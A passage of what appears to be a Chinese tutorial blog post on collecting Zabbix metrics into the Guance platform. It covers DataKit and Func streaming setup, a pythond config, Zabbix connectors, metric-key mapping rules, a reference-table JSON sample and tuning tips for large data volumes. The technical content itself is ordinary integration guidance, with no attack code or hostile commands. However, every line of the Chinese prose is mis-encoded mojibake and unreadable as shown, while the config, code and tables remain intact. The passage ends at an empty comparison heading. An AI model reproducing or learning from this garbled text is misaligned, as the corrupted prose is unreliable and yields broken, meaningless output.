<p>ç‚¹å‡»å®‰è£…æŒ‰é’®ï¼Œå¹¶åœ¨å¼¹å‡ºçš„ç¡®è®¤æ¡†ç‚¹å‡»ç¡®è®¤æŒ‰é’®ã€‚ç‚¹å‡»ç¡®è®¤åï¼Œåœ¨å¼¹å‡ºçš„éƒ¨ç½²å¯¹è¯æ¡†ä¸­è¾“å…¥ zabbix çš„åœ°å€ï¼Œç”¨æˆ·åï¼Œå¯†ç ï¼Œä»¥åŠç‰ˆæœ¬å·ã€‚ç¡®è®¤ä¿¡æ¯æ— è¯¯åï¼Œç‚¹å‡»éƒ¨ç½²å¯åŠ¨è„šæœ¬ï¼Œå³å¯å®Œæˆè„šæœ¬çš„éƒ¨ç½²ä»¥åŠé‡‡é›†ä»»åŠ¡çš„åˆ›å»ºã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10cd5cc64029450497bddbbe2a9e2d3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=4Kw6%2FbbrrlFcENVZe2FmukaeO9o%3D" alt="" loading="lazy"/></p>
<p>2ã€æŸ¥çœ‹é‡‡é›†ç»“æœ</p>
<p>ç™»å½•è§‚æµ‹äº‘ï¼Œç‚¹å‡»ã€ŒæŒ‡æ ‡ã€ - ã€ŒæŒ‡æ ‡ç®¡ç†ã€ï¼ŒæŸ¥æ‰¾ zabbix æŒ‡æ ‡ï¼Œçœ‹æ˜¯å¦é‡‡é›†åˆ°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c2d0ab17bd945979786a91b33e93fb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=0Yd83iJ%2Bv6NYeklAPKSOkKeUH0A%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">Streaming æ–¹å¼ï¼ˆzabbix &gt;= 6.4ï¼‰</h3>
<p>è¯¥æ–¹å¼ç±»ä¼¼äº Prometheus çš„ Remote Writeï¼Œç”± zabbix server ä¸»åŠ¨å°†æ•°æ®æ‰“ç»™ DataKitï¼Œæœ‰è¾ƒé«˜çš„æ—¶æ•ˆæ€§ã€‚</p>
<h4 data-id="heading-8">HTTP Server</h4>
<h5 data-id="heading-9">DataKit æ–¹å¼</h5>
<p>1ã€é…ç½® pythond é…ç½®æ–‡ä»¶</p>
<p>è¿›å…¥ DataKit çš„é…ç½®æ–‡ä»¶ç›®å½•Â <code>conf.d</code>ï¼Œè¿›å…¥Â <code>python.d</code>Â ç›®å½•ï¼Œå¤åˆ¶Â <code>pythond.conf.sample</code>Â ä¸ºÂ <code>pythond.conf</code>ï¼Œä¿®æ”¹å¦‚ä¸‹é…ç½®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[[inputs.pythond]]</span>
  <span class="hljs-comment"># Python input name</span>
  <span class="hljs-attr">name</span> = <span class="hljs-string">'zabbix_collect'</span>  <span class="hljs-comment"># required</span>

  <span class="hljs-comment"># System environments to run Python</span>
  <span class="hljs-comment">#envs = ['LD_LIBRARY_PATH=/path/to/lib:$LD_LIBRARY_PATH',]</span>
  <span class="hljs-attr">envs</span> = [<span class="hljs-string">'ZABBIX_HOST=http://127.0.0.1/zabbix'</span>, <span class="hljs-string">'ZABBIX_USER=Admin'</span>, <span class="hljs-string">'ZABBIX_PASSWD=zabbix'</span>, <span class="hljs-string">'ZABBIX_VERSION=7.0'</span>, <span class="hljs-string">'COLLECT_TYPE=stream'</span>, <span class="hljs-string">'STREAM_LISTENER_PORT=8000'</span>]

  <span class="hljs-comment"># Python path(recomment abstract Python path)</span>
  <span class="hljs-attr">cmd</span> = <span class="hljs-string">"python3"</span> <span class="hljs-comment"># required. python3 is recommended.</span>

  <span class="hljs-comment"># Python scripts relative path</span>
  <span class="hljs-attr">dirs</span> = [<span class="hljs-string">"zabbix"</span>]
</code></pre>
<p>å…¶ä¸­Â <code>ZABBIX_HOST</code>ï¼Œ<code>ZABBIX_USER</code>ï¼Œ<code>ZABBIX_PASSWD</code>ï¼Œ<code>ZABBIX_VERSION</code>Â å¡«å†™å®é™… Zabbix çš„åœ°å€ç”¨æˆ·åå¯†ç å’Œç‰ˆæœ¬ã€‚</p>
<p>æ³¨æ„ï¼ŒCOLLECT_TYPE å¿…é¡»ä¸º streamï¼Œ å¯æ ¹æ®éœ€è¦è°ƒæ•´ STREAM_LISTENER_PORT çš„å€¼ã€‚</p>
<p>ä¿å­˜å¹¶é€€å‡ºã€‚</p>
<p>2ã€å¤åˆ¶è„šæœ¬</p>
<p>è¿›å…¥ DataKit ç›®å½•ï¼Œè¿›å…¥ pythond ç›®å½•ï¼Œåˆ›å»º zabbix ç›®å½•ï¼Œç‚¹å‡»ä¸‹æ–¹é“¾æ¥ä¸‹è½½è„šæœ¬åˆ° zabbix ç›®å½•ä¸‹ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fstatic.guance.com%2Fintegrations%2Fzabbix%2Fzabbix-collector.py" target="_blank" title="https://static.guance.com/integrations/zabbix/zabbix-collector.py" ref="nofollow noopener noreferrer">static.guance.com/integrationâ€¦</a></p>
<p>3ã€é‡å¯ DataKit</p>
<pre><code class="hljs">datakit service -R
</code></pre>
<p>4ã€æ£€æŸ¥é‡‡é›†ä»»åŠ¡ï¼Œå‡ºç° zabbix_collect ä»»åŠ¡åˆ™è¯´æ˜é‡‡é›†ä»»åŠ¡å¼€å¯æˆåŠŸ</p>
<pre><code class="hljs">datakit monitor
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/566c0bcd2ab24e0b80d8534067aafae2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=T%2BedZ4YNri%2FF61gfgjjg%2B6kYhZs%3D" alt="" loading="lazy"/></p>
<p>5ã€åˆ›å»º Zabbix è¿æ¥å™¨</p>
<p>ç™»å½• Zabbixï¼Œç‚¹å‡»ç®¡ç† -&gt; å¸¸è§„ -&gt; è¿æ¥å™¨ï¼Œç‚¹å‡»åˆ›å»ºè¿æ¥å™¨ï¼ŒURLå¤„è¾“å…¥ DataKit çš„åœ°å€ä»¥åŠÂ <code>zabbix stream</code>Â çš„ç›‘å¬ç«¯å£ï¼ˆé»˜è®¤8000ï¼‰ï¼Œä¿¡æ¯ç±»å‹é€‰æ‹©æ•°å­—å’Œæµ®ç‚¹æ•°ï¼Œç‚¹å‡»æ·»åŠ ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77456d272b7342769f2883bf605a6eff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=Da8hzZy66f2MeVNOoT0VvHEfQQw%3D" alt="" loading="lazy"/></p>
<p>6ã€ä¿®æ”¹Â <code>zabbix_server.conf</code>ï¼Œä¿®æ”¹Â <code>StartConnectors</code>Â ä¸º10ï¼Œä¿å­˜å¹¶é‡å¯Â <code>zabbix-server</code>Â æœåŠ¡</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adbe2bcadbe94c99bbbb4c5d6c6e47d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=zn7Fm518i3YP0pILmghv6kq5uyE%3D" alt="" loading="lazy"/></p>
<p>7ã€éªŒè¯æŒ‡æ ‡é‡‡é›†ç»“æœ</p>
<h5 data-id="heading-10">Func æ–¹å¼</h5>
<p>1ã€å®‰è£…é‡‡é›†è„šæœ¬</p>
<p>ç™»å½• Funcï¼Œç‚¹å‡»ã€Œè„šæœ¬å¸‚åœºã€ï¼Œé€‰æ‹©é¢„è£…è„šæœ¬å¸‚åœºï¼Œç‚¹å‡»ç®¡ç†æŒ‰é’®ï¼Œè¿›å…¥é¢„è£…è„šæœ¬å¸‚åœºçš„è„šæœ¬åˆ—è¡¨é¡µã€‚åœ¨è¿‡æ»¤æœç´¢æ¡†ä¸­è¾“å…¥zabbix Stream ï¼Œè¿‡æ»¤å‡ºzabbix Streamé‡‡é›†è„šæœ¬ã€‚ç‚¹å‡»å®‰è£…å³å¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e492c3dabc2f41a3ae4f096d771ac741~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=%2BayeJnHexD1aPYxpW06QJRTEYFs%3D" alt="" loading="lazy"/></p>
<p>2ã€åˆ›å»ºURL</p>
<p>ç™»å½• Funcï¼Œç‚¹å‡»ã€Œç®¡ç†ã€ - ã€ŒåŒæ­¥ APIã€ï¼ˆå»ºè®®ä½¿ç”¨å¼‚æ­¥APIï¼‰- ã€Œæ–°å»ºã€ï¼Œ æ‰§è¡Œä¸€æ é€‰æ‹©åˆšå¯¼å…¥è„šæœ¬ä¸­çš„Â <code>Zabbix Receiver</code>Â æ–¹æ³•ï¼Œåœ¨å‚æ•°æŒ‡å®šä¸­é…ç½®é‡‡é›†ä»»åŠ¡ç›¸å…³çš„é…ç½®ï¼Œéœ€è¦æŒ‡å®šÂ <code>zabbix_host</code>ï¼Œ<code>zabbix_user</code>ï¼Œ<code>zabbix_passwd</code>ï¼Œ<code>zabbix_version</code>Â ä¸ºå®é™…çš„å€¼ï¼Œ<code>base64</code>Â ä¸º Zabbix å…¥å‚ï¼Œæ­¤å¤„å¡«Â <code>INPUT_BY_CALLER</code>ï¼Œç‚¹å‡»ä¿å­˜ï¼Œå¹¶å¤åˆ¶ urlã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c028ed97fa849b89c4835f19a3fa9f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=4rSuVlqpppTmp3ZUfQ4mqxApCgQ%3D" alt="" loading="lazy"/></p>
<p>3ã€åˆ›å»º Zabbix è¿æ¥å™¨</p>
<p>ç™»å½• Zabbixï¼Œ ç‚¹å‡»ç®¡ç† -&gt; å¸¸è§„ -&gt; è¿æ¥å™¨ï¼Œç‚¹å‡»åˆ›å»ºè¿æ¥å™¨ï¼ŒURL å¤„è¾“å…¥ä¸Šä¸€æ­¥åˆ›å»ºçš„ urlï¼Œä¿¡æ¯ç±»å‹é€‰æ‹©æ•°å­—å’Œæµ®ç‚¹æ•°ï¼Œç‚¹å‡»æ·»åŠ ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/962272f03dcb4d32a56514399583aeb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=LaP0QwlgdB0nTFMeXybhIBABwAI%3D" alt="" loading="lazy"/></p>
<p>4ã€ä¿®æ”¹Â <code>zabbix_server.conf</code>ï¼Œä¿®æ”¹Â <code>StartConnectors</code>Â ä¸º10ï¼Œä¿å­˜å¹¶é‡å¯Â <code>zabbix-server</code>Â æœåŠ¡</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05c9d21eee8d44a0affc61ad6da3d6e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=CI%2FiPeZcAtwKoFxvLqLaFcXKMEs%3D" alt="" loading="lazy"/></p>
<p>5ã€éªŒè¯æŒ‡æ ‡é‡‡é›†ç»“æœ</p>
<h4 data-id="heading-11">Kafka</h4>
<p>è¯¥æ–¹å¼åŸç†åŒ HTTP æ–¹å¼æ¶ˆè´¹æŒ‡æ ‡æ•°æ®ï¼ŒåŒºåˆ«åœ¨äºè¯¥æ–¹æ³•å¼•å…¥äº† Kafka ç»„ä»¶ï¼Œéœ€éƒ¨ç½²ä¸€ä¸ª HTTP æœåŠ¡ç”¨äºæ¥æ”¶ Zabbix çš„ stream è¾“å‡ºå¹¶å°†æ¶ˆæ¯å‘é€åˆ° Kafka ä¸­ï¼Œè¯¦è§<a href="https://link.juejin.cn?target=https%3A%2F%2Fgit.zabbix.com%2Fprojects%2FZT%2Frepos%2Fkafka-connector%2Fbrowse%25EF%25BC%258C%25E5%2586%258D%25E7%2594%25B1%25E6%25B6%2588%25E8%25B4%25B9%25E8%2580%2585%25E8%25AE%25A2%25E9%2598%2585" target="_blank" title="https://git.zabbix.com/projects/ZT/repos/kafka-connector/browse%EF%BC%8C%E5%86%8D%E7%94%B1%E6%B6%88%E8%B4%B9%E8%80%85%E8%AE%A2%E9%98%85" ref="nofollow noopener noreferrer">git.zabbix.com/projects/ZTâ€¦</a> Kafkaï¼Œè¿›è¡Œæ•°æ®æ¶ˆè´¹ã€‚</p>
<h3 data-id="heading-12">æŒ‡æ ‡æ²»ç†</h3>
<h4 data-id="heading-13">Zabbix æŒ‡æ ‡æ•°æ®ç»“æ„</h4>
<p>Zabbix ä»¥ä¸»æœºä¸ºç»´åº¦ç»Ÿè®¡æŒ‡æ ‡å’Œå‘Šè­¦ã€‚æ‰€ä»¥æ‰€æœ‰çš„æŒ‡æ ‡å¿…ç„¶åŒ…å«ä¸»æœºä¿¡æ¯ã€‚ä¸»æœºå¾€å¾€ç»‘å®šä¸€ä¸ªæˆ–å¤šä¸ªæ¥å£ã€‚</p>
<p>Zabbix çš„æŒ‡æ ‡ï¼ˆ<code>item key</code>ï¼‰ çš„å½¢å¼ä¸ºÂ <code>key[param1,param2,param3]</code>ã€‚å…¶ä¸­Â <code>params</code>Â åˆ†ä¸ºé™æ€å€¼å’Œå˜é‡ä¸¤ç§ã€‚</p>
<p>å¦‚Â <code>vfs.fs.size[{#FSNAME},pused]</code>ã€‚å…¶ä¸­Â <code>key</code>Â ä¸ºÂ <code>vfs.fs.size</code>ï¼Œ<code>{#FSNAME}</code>Â æ˜¯åŠ¨æ€å‚æ•°ï¼ŒæŒ‡å®é™…æ–‡ä»¶ç³»ç»Ÿåï¼Œ<code>pused</code>Â ä¸ºé™æ€å‚æ•°ï¼ŒæŒ‡ä½¿ç”¨é‡ã€‚</p>
<p>ä¸Šè¿°é‡‡é›†æ–¹å¼ä¸­Â <code>zabbix api</code>ï¼Œ<code>Streaming</code>ï¼Œ<code>Zabbix Agent 2</code>Â ä¸‰ç§é‡‡é›†æ–¹å¼å‡é»˜è®¤ä½¿ç”¨è¯¥è§„åˆ™è¿›è¡ŒæŒ‡æ ‡æ˜ å°„ã€‚</p>
<h4 data-id="heading-14">å»ºè®®çš„æŒ‡æ ‡æ²»ç†è§„åˆ™</h4>
<p>ç”±äº Zabbix çš„æ•°æ®ç»“æ„è·Ÿè§‚æµ‹äº‘å­˜åœ¨è¾ƒå¤§å·®å¼‚ï¼Œä¸ºæ–¹ä¾¿æŒ‡æ ‡çš„ä½¿ç”¨ä¸ç®¡ç†ï¼Œç»“åˆå®é™…ä¼ä¸šç”¨æˆ·çš„éƒ¨ç½²ç»éªŒï¼Œå¯¹äº API å’Œ Streaming çš„é‡‡é›†æ–¹å¼ï¼Œæˆ‘ä»¬å»ºè®® Zabbix æŒ‡æ ‡æ•°æ®ä¸Šä¼ åˆ°è§‚æµ‹äº‘æ—¶æŒ‰å¦‚ä¸‹è§„åˆ™è¿›è¡Œè½¬æ¢ï¼š</p>
<ul>
<li>measurement (æŒ‡æ ‡é›†)ï¼š<code>zabbix key</code>Â ç¬¬ä¸€ä¸ª '.' å‰çš„å†…å®¹ã€‚</li>
<li>fields (æŒ‡æ ‡)ï¼š<code>zabbix key</code>Â + æ‰€æœ‰é™æ€å‚æ•°ã€‚å¦‚Â <code>vfs.fs.size[{#FSNAME},pused]</code>ï¼Œå°±ä¼šå˜æˆÂ <code>vfs.fs.size.pused</code>ï¼Œ<code>system.cpu.load[all,avg1]</code>ï¼Œå°±ä¼šå˜æˆ<code>system.cpu.load.all.avg1</code>ã€‚</li>
<li>tags (æ ‡ç­¾)ï¼š<code>zabbix item key</code>Â ä¸­çš„æ‰€æœ‰åŠ¨æ€å‚æ•°å°å†™ã€‚åŒæ—¶ä¼šæ·»åŠ Â <code>host</code>ï¼Œ<code>ip</code>Â ä»¥åŠÂ <code>item</code>Â çš„Â <code>tag</code>sã€‚å¦‚ï¼š<code>vfs.fs.size[{#FSNAME},pused]</code>Â çš„Â <code>tag</code>Â ä¸ºÂ <code>fsname</code>ã€‚</li>
</ul>
<p>Exampleï¼š</p>

































































<table><thead><tr><th>Zabbix item key</th><th>measurement</th><th>Field</th><th>tags</th></tr></thead><tbody><tr><td>vfs.dev.queue_size[{#DEVNAME}]</td><td>vfs</td><td>vfs.dev.queue_size</td><td>devname</td></tr><tr><td>vfs.dev.read.await[{#DEVNAME}]</td><td>vfs</td><td>vfs.dev.read.await</td><td>devname</td></tr><tr><td>vfs.dev.read.rate[{#DEVNAME}]</td><td>vfs</td><td>vfs.dev.read.rate</td><td>devname</td></tr><tr><td>vfs.file.contents[/sys/block/{#DEVNAME}/stat]</td><td>vfs</td><td>vfs.file.contents._sys_blck__stat</td><td>devname</td></tr><tr><td>vfs.file.contents["/sys/class/net/{#IFNAME}/type"]</td><td>vfs</td><td>vfs.file.contents._sys_class_net__type</td><td>ifname</td></tr><tr><td>vfs.fs.inode[{#FSNAME},pfree]</td><td>vfs</td><td>vfs.fs.inode.pfree</td><td>fsname</td></tr><tr><td>vfs.fs.size[{#FSNAME},pused]</td><td>vfs</td><td>vfs.fs.size.pused</td><td>fsname</td></tr><tr><td><a href="https://link.juejin.cn?target=http%3A%2F%2Fnet.if.in%2F" target="_blank" title="http://net.if.in/" ref="nofollow noopener noreferrer">net.if.in</a>["{#IFNAME}",dropped]</td><td>vfs</td><td>net.if.in.dropped</td><td>ifname</td></tr><tr><td><a href="https://link.juejin.cn?target=http%3A%2F%2Fnet.if.in%2F" target="_blank" title="http://net.if.in/" ref="nofollow noopener noreferrer">net.if.in</a>["{#IFNAME}"]</td><td>vfs</td><td><a href="https://link.juejin.cn?target=http%3A%2F%2Fnet.if.in%2F" target="_blank" title="http://net.if.in/" ref="nofollow noopener noreferrer">net.if.in</a></td><td>ifname</td></tr></tbody></table>
<h4 data-id="heading-15">ä½¿ç”¨ Pipeline çš„ reference table å®ç°è‡ªå®šä¹‰ Tag</h4>
<p>åœºæ™¯ï¼šå¯¹äºå·²æœ‰ CMDB çš„å®¢æˆ·ï¼Œå¸Œæœ›å°†ä¸»æœºçš„ä¸€äº›å­—æ®µå¯Œè¶³åˆ°æŒ‡æ ‡ Tag ä¸­ã€‚å¦‚åº”ç”¨ã€è´Ÿè´£äººä¿¡æ¯ç­‰ã€‚</p>
<p>æ–¹å¼ï¼šä½¿ç”¨ Pipeline çš„ refertable åŠŸèƒ½ã€‚</p>
<p>å…·ä½“æ­¥éª¤ï¼š</p>
<p>1ã€ä½¿ç”¨ Func åˆ›å»ºä¸€ä¸ªè„šæœ¬ç”¨äºç»„è£… reference table æ•°æ®ï¼Œå¹¶å‘å¸ƒã€‚æ•°æ®ç»“æ„ç±»ä¼¼äºï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
<span class="hljs-attr">"table_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"zabbix-refer-table"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"column_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"itemid"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"host"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"ip"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"itemkey"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"column_type"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"string"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"string"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"row_data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-string">"1001"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"host-1"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"10.0.0.1"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"vfs.fs.size"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-punctuation">[</span><span class="hljs-string">"1002"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"host-2"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"10.0.0.2"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"vfs.fs.size.pused"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> 
    <span class="hljs-punctuation">[</span><span class="hljs-string">"1003"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"host-3"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"10.0.0.3"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"vfs.fs.size.pfree"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>æ›´å¤š reference table ç”¨æ³•ï¼Œå¯å‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.guance.com%2Fdatakit%2Fdatakit-refer-table%2F" target="_blank" title="https://docs.guance.com/datakit/datakit-refer-table/" ref="nofollow noopener noreferrer">docs.guance.com/datakit/datâ€¦</a></p>
<p>2ã€åˆ›å»ºåŒæ­¥ API</p>
<p>ç™»å½• Funcï¼Œç‚¹å‡»ã€Œç®¡ç†ã€ - ã€ŒåŒæ­¥ APIã€ï¼Œç‚¹å‡» æ–°å»ºï¼Œåœ¨æ·»åŠ åŒæ­¥ API å¯¹è¯æ¡†æ‰§è¡Œä¸€æ ä¸­é€‰æ‹© zabbix-reference-table è·å–è„šæœ¬ï¼Œç‚¹å‡»ç¡®å®šä¿å­˜è„šæœ¬ï¼Œå¹¶ç‚¹å‡»ç¤ºä¾‹ï¼Œè·å–è¯·æ±‚ APIã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65f857d7aa7645e8b370dbf294149ca5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=YGfGlgzxaGc1%2BXXCU6iSm24vmj0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9bed20543834c0ca47ae71f7ba07969~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=Xv8hlJmQnry4ZGIm7EkTG5Ap7mg%3D" alt="" loading="lazy"/></p>
<p>3ã€ç¼–è¾‘ DataKit çš„é…ç½®æ–‡ä»¶</p>
<p>ç™»å½• DataKit æ‰€åœ¨æœåŠ¡å™¨ï¼ˆå®¹å™¨éƒ¨ç½²DataKit å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼‰ï¼Œè¿›å…¥ DataKit é…ç½®ç›®å½•Â <code>/user/local/datakit/conf.d</code>ï¼Œç¼–è¾‘Â <code>datakit.conf</code>Â æ–‡ä»¶ï¼Œä¿®æ”¹Â <code>[pipeline]</code>Â é€‰é¡¹ä¸‹çš„Â <code>refer_table_url</code>Â çš„å€¼ä¸ºä¸Šä¸€æ­¥å¤åˆ¶çš„ Func æ¥å£åœ°å€ã€‚DataKit ä¼šå°† refertable æ•°æ®é¢„å…ˆåŠ è½½åˆ°æœ¬åœ°çš„ sqllite ä¸­ï¼Œå¯ä»¥æ ¹æ® refer table å¤§å°çµæ´»é€‰æ‹©æ˜¯å¦ä½¿ç”¨å†…å­˜æ¨¡å¼çš„ sqlliteã€‚ä¿å­˜åé‡å¯ DataKit ç”Ÿæ•ˆã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4fa789e5bf34d86910dadaabae7afb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=Gldo%2BCUnpfFZvt%2FQb8sTNaxUC3A%3D" alt="" loading="lazy"/></p>
<p>4ã€ç¼–è¾‘ Pipeline</p>
<p>ç™»å½•è§‚æµ‹äº‘ï¼Œç‚¹å‡»ã€Œç®¡ç†ã€ - ã€ŒPipelinesã€- ã€Œæ–°å»º Pipelineã€ï¼Œè¿™é‡Œç»™åˆ°ä¸€ä¸ªå‚è€ƒ Pipelineï¼Œå¯æ ¹æ®å®é™…ä¸šåŠ¡æƒ…å†µå’Œ refertable æ•°æ®ç»“æ„çµæ´»è°ƒæ•´ã€‚</p>
<p>5ã€æŸ¥çœ‹æŒ‡æ ‡ Tag</p>
<h3 data-id="heading-16">è¶…å¤§æ•°æ®é‡é‡‡é›†ä¼˜åŒ–ç­–ç•¥</h3>
<ul>
<li>å¯¹äº Export Directory æ–¹å¼ï¼Œå¯ä»¥å¢åŠ ç‹¬ç«‹çš„é«˜é€Ÿ SSD ç£ç›˜ï¼Œå¢åŠ å•ç‹¬çš„ zabbix server ç”¨äºæ•°æ®å¯¼å‡ºï¼ˆç”±äºéœ€è¦è®¿é—® zabbix API å’Œæ•°æ®åº“ï¼ŒDataKit é‡‡é›† ExportDirectory ä¼šæ¯”è¾ƒå ç”¨ zabbix èµ„æºï¼‰ã€‚è°ƒä½ ExportFileSize å¤§å°ã€‚</li>
<li>API é‡‡é›†æ–¹å¼ï¼Œå¯ä»¥é€šè¿‡åˆ†é¡µæŸ¥è¯¢ï¼Œå‡å°‘æŸ¥è¯¢å…³è”è¡¨ï¼Œå¤šçº¿ç¨‹æŸ¥è¯¢ç­‰æ–¹å¼ã€‚</li>
<li>HTTP stream æ–¹å¼ï¼Œå¯ä»¥å¼•å…¥é˜Ÿåˆ—è¿›è¡Œå¼‚æ­¥æ¶ˆè´¹æˆ–ä½¿ç”¨å¼‚æ­¥æ–¹æ³•ã€‚æ”¯æŒé‡‡æ ·æ”¶é›†ç­‰æ–¹å¼ã€‚</li>
<li>æŒ‡æ ‡æ²»ç†åº”å…ˆå°†æ˜ å°„å…³ç³»ç”Ÿæˆåå­˜å…¥ç¼“å­˜æˆ–å†…å­˜ä¸­ï¼Œæ–¹ä¾¿å¿«é€ŸåŒ¹é…ã€‚ä¸ºå‡å°‘ redis è¯»å†™å‹åŠ›å¯ä»¥è€ƒè™‘åˆ†ç‰‡ç¼“å­˜æˆ–ç¼“å­˜å‹ç¼©ç­‰æ–¹æ³•ã€‚</li>
</ul>
<h3 data-id="heading-17">å„é‡‡é›†æ–¹å¼å¯¹æ¯”</h3>





























